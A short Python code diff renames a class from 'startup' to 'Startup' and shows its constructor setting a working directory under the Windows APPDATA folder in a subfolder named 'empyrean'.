@@ -3,7 +3,7 @@ import os
 import shutil
 import sys
  
-class startup:
+class Startup:
     def __init__(self) -> None:        
         self.working_dir = os.getenv("APPDATA") + "\\empyrean"
     
